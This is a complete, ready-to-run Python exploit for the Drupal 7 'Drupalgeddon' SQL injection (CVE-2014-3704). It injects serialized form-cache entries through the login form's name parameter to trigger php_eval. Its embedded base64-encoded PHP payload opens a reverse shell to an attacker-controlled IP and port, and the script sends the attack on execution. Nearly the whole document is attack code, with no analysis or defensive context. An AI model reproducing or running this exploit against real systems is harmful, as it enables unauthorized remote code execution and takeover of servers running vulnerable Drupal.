#!/usr/bin/python3

import random
import string
import base64
import urllib.parse
import requests

# CVE-2014-3704 aka Drupalgeddon - Form-Cache Injection Method

uri = 'http://10.10.10.10:8000/?q=user/login'
ipAddr = '172.17.0.1'
port = '4444'

headers = {
    'User-Agent': 'Mozilla/5.0 (Linux x86_64; rv:103.0) Gecko/20200101 Firefox/103.0',
    'Content-Type': 'application/x-www-form-urlencoded'
}

proxies = {
    #'http': 'http://127.0.0.1:8080'
}

def rstring(length):
    alpha = string.ascii_letters + string.digits
    rs = ''.join(random.choice(alpha) for x in range(length))
    return rs
    
def sql_insert(id, value):
    curlyopen = rstring(8)
    curlyclose = rstring(8)
    value = value.replace('{', curlyopen)
    value = value.replace('}', curlyclose)
    
    q =   "INSERT INTO {cache_form} (cid, data, expire, created, serialized) "
    q += f"VALUES ('{id}', REPLACE(REPLACE('{value}', '{curlyopen}', CHAR(123)), '{curlyclose}', CHAR(125)), -1, 0, 1);"
    
    return q
    
def exploit():
    form_id = 'form-' + rstring(43)
    evalstr = "cache_clear_all(array('form_" + form_id + "', 'form_state_" + form_id + "'), 'cache_form'); "
    
    # msfvenom -p php/reverse_php LHOST=172.17.0.1 LPORT=4444 | sed -E 's/\/\*<\?php \/\*\*\///g' | tr -d '\n' | tr -s ' '
    evalstr += "@error_reporting(0); @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0); $dis=@ini_get('disable_functions'); if(!empty($dis)){ $dis=preg_replace('/[, ]+/', ',', $dis); $dis=explode(',', $dis); $dis=array_map('trim', $dis); }else{ $dis=array(); } $ipaddr='"+ipAddr+"'; $port="+port+"; if(!function_exists('hpMQzgSjkVMJkd')){ function hpMQzgSjkVMJkd($c){ global $dis; if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) { $c=$c.\" 2>&1\\n\"; } $JuAkV='is_callable'; $kAESfN='in_array'; if($JuAkV('popen')and!$kAESfN('popen',$dis)){ $fp=popen($c,'r'); $o=NULL; if(is_resource($fp)){ while(!feof($fp)){ $o.=fread($fp,1024); } } @pclose($fp); }else if($JuAkV('exec')and!$kAESfN('exec',$dis)){ $o=array(); exec($c,$o); $o=join(chr(10),$o).chr(10); }else if($JuAkV('proc_open')and!$kAESfN('proc_open',$dis)){ $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes); $o=NULL; while(!feof($pipes[1])){ $o.=fread($pipes[1],1024); } @proc_close($handle); }else if($JuAkV('system')and!$kAESfN('system',$dis)){ ob_start(); system($c); $o=ob_get_contents(); ob_end_clean(); }else if($JuAkV('shell_exec')and!$kAESfN('shell_exec',$dis)){ $o=shell_exec($c); }else if($JuAkV('passthru')and!$kAESfN('passthru',$dis)){ ob_start(); passthru($c); $o=ob_get_contents(); ob_end_clean(); }else { $o=0; } return $o; } } $nofuncs='no exec functions'; if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){ $s=@fsockopen(\"tcp://"+ipAddr+"\",$port); while($c=fread($s,2048)){ $out = ''; if(substr($c,0,3) == 'cd '){ chdir(substr($c,3,-1)); } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') { break; }else{ $out=hpMQzgSjkVMJkd(substr($c,0,-1)); if($out===false){ fwrite($s,$nofuncs); break; } } fwrite($s,$out); } fclose($s); }else{ $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP); @socket_connect($s,$ipaddr,$port); @socket_write($s,\"socket_create\"); while($c=@socket_read($s,2048)){ $out = ''; if(substr($c,0,3) == 'cd '){ chdir(substr($c,3,-1)); } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') { break; }else{ $out=hpMQzgSjkVMJkd(substr($c,0,-1)); if($out===false){ @socket_write($s,$nofuncs); break; } } @socket_write($s,$out,strlen($out)); } @socket_close($s); }"
    
    evalstr = "<?php eval(base64_decode(\\'" + base64.b64encode(evalstr.encode('UTF-8')).decode('UTF-8') + "\\'));"
    
    state =  'a:1:{'
    state +=   's:10:"build_info";a:1:{'
    state +=     's:5:"files";a:1:{'
    state +=       'i:0;s:22:"modules/php/php.module";'
    state +=     '}'
    state +=   '}'
    state += '}'
    
    form =  'a:6:{'
    form +=   's:5:"#type";s:4:"form";'
    form +=   's:8:"#parents";a:1:{i:0;s:4:"user";}'
    form +=   's:8:"#process";a:1:{i:0;s:13:"drupal_render";}'
    form +=   's:16:"#defaults_loaded";b:1;'
    form +=   's:12:"#post_render";a:1:{i:0;s:8:"php_eval";}'
    form +=   's:9:"#children";s:' + str(len(evalstr)-2) + ':"' + evalstr + '";'
    form += '}'
    
    sql =  sql_insert('form_state_' + form_id, state)
    sql += sql_insert('form_' + form_id, form)
    sql += 'SELECT SLEEP(666);#'
    
    sql = urllib.parse.quote(sql, safe="\\/")
    
    try:
        data = "form_id=user_login&form_build_id=&name[0;"+sql+"]=&name[0]=&op=Log%20in&pass="+rstring(8)
        requests.post(url=uri, data=data, headers=headers, proxies=proxies, timeout=5)
    except:
        data = "form_id=user_login&form_build_id="+form_id+"&name="+rstring(8)+"&op=Log%20in&pass="+rstring(8)
        requests.post(url=uri, data=data, headers=headers, proxies=proxies)

exploit()
